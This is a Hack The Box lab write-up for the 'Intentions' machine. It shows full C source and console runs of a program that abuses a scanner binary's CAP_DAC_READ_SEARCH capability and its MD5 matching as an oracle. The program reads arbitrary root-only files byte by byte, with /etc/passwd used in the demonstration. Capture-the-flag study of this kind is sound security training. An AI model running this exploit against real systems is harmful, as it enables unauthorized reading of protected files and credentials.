# Hack The Box. Machines. Intentions

Machine write-up: https://7rocky.github.io/en/htb/intentions

### `get_file.c`

This C program is employed to read files from the file system using a binary with `CAP_DAC_READ_SEARCH` capability set (allows to read any file as `root`). The file is read byte by byte using an oracle with an MD5 hash.

This is the help panel of such binary:

```console
greg@intentions:~$ /opt/scanner/scanner
The copyright_scanner application provides the capability to evaluate a single file or directory of files against a known blacklist and return matches.

        This utility has been developed to help identify copyrighted material that have previously been submitted on the platform.
        This tool can also be used to check for duplicate images to avoid having multiple of the same photos in the gallery.
        File matching are evaluated by comparing an MD5 hash of the file contents or a portion of the file contents against those submitted in the hash file.

        The hash blacklist file should be maintained as a single LABEL:MD5 per line.
        Please avoid using extra colons in the label as that is not currently supported.

        Expected output:
        1. Empty if no matches found
        2. A line for every match, example:
                [+] {LABEL} matches {FILE}

  -c string
        Path to image file to check. Cannot be combined with -d
  -d string
        Path to image directory to check. Cannot be combined with -c
  -h string
        Path to colon separated hash file. Not compatible with -p
  -l int
        Maximum bytes of files being checked to hash. Files smaller than this value will be fully hashed. Smaller values are much faster but prone to false positives. (default 500)
  -p    [Debug] Print calculated file hash. Only compatible with -c
  -s string
        Specific hash to check against. Not compatible with -h
```

Basically, the tool takes a file and computes an MD5 hash. Then, it is then compared against a list of hashes in order to find coincidences. We can set the number of bytes to read from the file with `-l`.

The idea is to pre-compute all possible 256 MD5 hashes for a single byte, tell the binary to take a single character from a file, so that it matches the hash with one of the pre-computed list. As a result, we will know the plaintext byte of the file. Then, we keep the first byte fix and compute another list of 256 MD5 hashes iterating over the second character, and tell the binary to use two bytes... And so on and so forth.

Probably, this output will make things clearer:

```console
greg@intentions:~$ head -1 /etc/passwd
root:x:0:0:root:/root:/bin/bash
greg@intentions:~$ cd /tmp
greg@intentions:/tmp$ echo -n r | md5sum
4b43b0aee35624cd95b910189b3dc231  -
greg@intentions:/tmp$ echo r:4b43b0aee35624cd95b910189b3dc231 > hashes
greg@intentions:/tmp$ /opt/scanner/scanner -l 1 -c /etc/passwd -h /tmp/hashes  
[+] r matches /etc/passwd
greg@intentions:/tmp$ echo -n ro | md5sum
3605c251087b88216c9bca890e07ad9c  -
greg@intentions:/tmp$ echo o:3605c251087b88216c9bca890e07ad9c > hashes
greg@intentions:/tmp$ /opt/scanner/scanner -l 2 -c /etc/passwd -h /tmp/hashes
[+] o matches /etc/passwd
greg@intentions:/tmp$ echo -n roo | md5sum
6606afc4c696fa1b4f0f68408726649d  -
greg@intentions:/tmp$ echo o:6606afc4c696fa1b4f0f68408726649d > hashes
greg@intentions:/tmp$ /opt/scanner/scanner -l 3 -c /etc/passwd -h /tmp/hashes
[+] o matches /etc/passwd
greg@intentions:/tmp$ echo -n root | md5sum
63a9f0ea7bb98050796b649e85481845  -
greg@intentions:/tmp$ echo t:63a9f0ea7bb98050796b649e85481845 > hashes
greg@intentions:/tmp$ /opt/scanner/scanner -l 4 -c /etc/passwd -h /tmp/hashes
[+] t matches /etc/passwd
```

This is the `main` function:

```c
int main(int argc, char* argv[]) {
        char content[4096];
        char* filename;
        char c;
        int length;

        if (argc < 2) {
                printf("[!] Usage: %s <file-to-read>\n", argv[0]);
                return 1;
        }

        filename = argv[1];
        length = 0;

        memset(content, '\0', sizeof(content));

        do {
                write_hashes(content, length);
                c = run_scanner(filename, length + 1);
                content[length++] = c;
        } while ((c != '\0') && (length != sizeof(content)));

        printf("%s", content);

        return 0;
}
```

The function is so simple. As can be seen, there is a `do`-`while` loop that calls `write_hashes` and `run_scanner`. The character is returned from `run_scanner` and it is appended to `content`. Finally, the variable `content` is printed out.

The function `write_hashes` takes the current value of `contents` and the current length of known bytes:

```c
void write_hashes(char* preffix, int preffix_length) {
        MD5_CTX ctx;
        FILE* fp;
        int c;
        int i;
        int length;
        char* str;
        char hash[33];
        unsigned char digest[16];

        length = preffix_length + 1;
        str = malloc(length + 1);

        fp = fopen("/tmp/hashes", "w");

        if (fp == NULL) {
                puts("[-] Failed to open /tmp/hashes");
                exit(1);
        }

        for (c = 0; c < 256; c++) {
                snprintf(str, length + 1, "%s%c", preffix, c);
                MD5_Init(&ctx);
                MD5_Update(&ctx, str, strlen(str));
                MD5_Final(digest, &ctx);

                for (i = 0; i < 16; i++) {
                        snprintf(hash + i * 2, 32, "%02x", digest[i]);
                }

                fprintf(fp, "%d:%s\n", c, hash);
        }

        fclose(fp);
        free(str);
}
```

Here, we just set up `MD5` functions and use a `for` loop to compute the hashes of `preffix` plus the iterating character `c`:

```c
        for (c = 0; c < 256; c++) {
                snprintf(str, length + 1, "%s%c", preffix, c);
                MD5_Init(&ctx);
                MD5_Update(&ctx, str, strlen(str));
                MD5_Final(digest, &ctx);

                for (i = 0; i < 16; i++) {
                        snprintf(hash + i * 2, 32, "%02x", digest[i]);
                }

                fprintf(fp, "%d:%s\n", c, hash);
        }
```

The results are written to a file at `/tmp/hashes`, with format `"%d:%s\n"`. This means that the ASCII decimal value of each iterating character will be together the corresponding MD5 hash (separated by a colon).

Finally, `run_scanner` takes the `filename` (taken from `argv[1]`, as a command-line argument), and `length + 1`, to consider the next byte:

```c
char run_scanner(char* filename, int num_bytes) {
        FILE* fp;
        char cmd[256];
        char out[256];
        int i;

        snprintf(cmd, sizeof(cmd), "./scanner -l %d -c %s -h /tmp/hashes", num_bytes, filename);

        fp = popen(cmd, "r");

        if (fp == NULL) {
                puts("[-] Failed to run command");
                exit(1);
        }

        i = 0;
        memset(out, '\0', sizeof(out));

        while (!feof(fp)) {
                out[i++] = fgetc(fp);
        }

        if (out[4] == '\0') {
                return '\0';
        }

        *(strchr(&out[4], ' ')) = '\0';

        pclose(fp);

        return atoi(&out[4]);
}
```

Here, we run the `scanner` binary with the expected parameters and then take the output of the program, which contains the plaintext byte as an ASCII decimal value. Using `atoi` we can convert it from `char*` to `int` (`char`).

If we use this program, we will be able to read files:

```console
greg@intentions:/opt/scanner$ /tmp/get_file /etc/hostname
intentions
```